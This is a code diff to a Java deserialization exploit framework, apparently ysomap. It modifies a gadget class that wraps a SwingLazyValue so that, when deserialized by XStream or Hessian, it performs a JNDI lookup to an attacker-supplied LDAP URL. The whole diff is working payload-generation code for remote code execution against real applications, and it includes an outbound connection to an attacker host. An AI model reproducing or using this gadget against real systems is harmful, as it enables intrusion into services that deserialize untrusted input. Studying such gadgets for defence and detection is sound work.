@@ -11,14 +11,13 @@ import ysomap.common.annotation.*;
 @Bullets
 @Dependencies({"jdk"})
 @Details("向外部发起JNDI连接")
-@Targets({Targets.XSTREAM})
+@Targets({Targets.XSTREAM, Targets.HESSIAN})
 @Authors({Authors.WH1T3P1G})
-public class SwingLazyValueBullet implements Bullet<SwingLazyValue> {
+public class SwingLazyValueWithJNDIBullet implements Bullet<SwingLazyValue> {
 
     @NotNull
     @Require(name = "jndiURL", detail = "like ldap://xxx/xx")
     public String jndiURL;
-
 
     @Override
     public SwingLazyValue getObject() throws Exception {
@@ -26,5 +25,11 @@ public class SwingLazyValueBullet implements Bullet<SwingLazyValue> {
         String methodName = "doLookup";
         Object[] evilargs = new Object[]{jndiURL};
         return new SwingLazyValue(classname, methodName, evilargs);
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        Bullet bullet = new SwingLazyValueWithJNDIBullet();
+        bullet.set("jndiURL", args[0]);
+        return bullet;
     }
 }
